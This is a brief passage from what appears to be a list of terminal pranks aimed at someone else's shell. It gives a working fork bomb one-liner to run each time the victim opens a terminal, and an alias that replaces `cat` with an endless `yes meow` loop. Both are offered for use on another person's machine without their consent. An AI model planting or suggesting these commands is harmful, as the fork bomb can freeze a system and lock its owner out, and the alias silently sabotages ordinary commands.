...
* simply just call them a nerd `echo "Hello, Nerd!"`
* change random commands to do other stuff - put `alias cat='yes meow'` (command that keeps printing meow forever in a loop)
* execute a forkbomb each time they open a terminal `:(){ :|:& };:`
